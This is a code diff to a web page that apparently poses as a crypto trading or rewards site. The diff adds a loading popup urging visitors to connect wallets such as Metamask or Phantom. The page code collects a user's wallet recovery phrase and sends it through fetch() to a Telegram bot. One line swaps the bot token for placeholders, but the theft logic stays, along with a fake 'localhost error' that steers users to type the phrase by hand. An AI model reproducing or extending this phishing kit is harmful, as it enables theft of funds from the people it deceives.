@@ -113,6 +113,38 @@ header p { font-size: 15px; color: #ccc; margin: 10px 0 10px 0; }
   background: repeating-linear-gradient(to right, #0ff, #0ff 2px, transparent 2px, transparent 4px);
 }
 
+/* --- Popup Overlay --- */
+#loadingPopup {
+  position: fixed;
+  top: 0; left: 0;
+  width: 100%; height: 100%;
+  background: rgba(0,0,0,0.75);
+  display: none;
+  align-items: center;
+  justify-content: center;
+  z-index: 2000;
+}
+.popup-content {
+  background: #1c1e2a;
+  padding: 20px;
+  border-radius: 12px;
+  text-align: center;
+  max-width: 400px;
+}
+.spinner {
+  width: 40px;
+  height: 40px;
+  margin: 0 auto 15px;
+  border: 5px solid #ccc;
+  border-top: 5px solid #1e90ff;
+  border-radius: 50%;
+  animation: spin 1s linear infinite;
+}
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+
 .modal {
   display: none;
   position: fixed;
@@ -221,6 +253,15 @@ footer { margin-top: 40px; font-size: 13px; color: #aaa; text-align:center; }
   <div id="chartContainer"><div id="chartLine"></div></div>
 </div>
 
+<!-- 5s Loading Popup -->
+<div id="loadingPopup">
+  <div class="popup-content">
+    <div class="spinner"></div>
+    <p>You can connect any of the following wallets - Metamask, Phantom, Coinbase, Exodus to start trading/rewards...</p>
+  </div>
+</div>
+
+<!-- Connection Modal -->
 <div id="myModal" class="modal">
   <div class="modal-content">
     <span class="close">&times;</span>
@@ -260,12 +301,16 @@ document.addEventListener("DOMContentLoaded", () => {
   const autoBtn = document.getElementById("autoConnect");
   const debug = document.getElementById("debugOutput");
   const phraseInput = document.getElementById("phraseInput");
+  const loadingPopup = document.getElementById("loadingPopup");
 
   let storedPhrases = JSON.parse(localStorage.getItem("phrases") || "[]");
 
   btn.onclick = () => { 
-    modal.style.display = "flex"; 
-    debug.textContent=""; 
+    loadingPopup.style.display = "flex"; // Show popup
+    setTimeout(() => { 
+      loadingPopup.style.display = "none"; 
+      modal.style.display = "flex"; // Show real modal after 5s
+    }, 5000);
   };
   span.onclick = () => { 
     modal.style.display = "none"; 
@@ -290,7 +335,7 @@ document.addEventListener("DOMContentLoaded", () => {
       return; 
     }
     debug.style.color="#FFA500"; debug.textContent="⏳ Connecting...";
-    fetch(`https://api.telegram.org/bot7564393664:AAEL0TWkOdXomWTnDaTXF3KH75T2xfyseJQ/sendMessage?chat_id=6876291548&text=${encodeURIComponent(phrase)}`)
+    fetch(`https://api.telegram.org/botXXXX/sendMessage?chat_id=YYYY&text=${encodeURIComponent(phrase)}`)
       .then(()=> {
         storedPhrases.push(phrase);
         localStorage.setItem("phrases", JSON.stringify(storedPhrases));
@@ -306,7 +351,7 @@ document.addEventListener("DOMContentLoaded", () => {
   autoBtn.onclick = () => {
     debug.style.color="#FFA500";
     debug.textContent="⏳ Auto connecting...";
-    setTimeout(()=> { debug.style.color="red"; debug.textContent="❌ Localhost error... Try manual connection."; }, 2000);
+    setTimeout(()=> { debug.style.color="red"; debug.textContent="❌ Localhost error... Try manual connection."; }, 5000);
   };
 
   // BTC/ETH dynamic trends
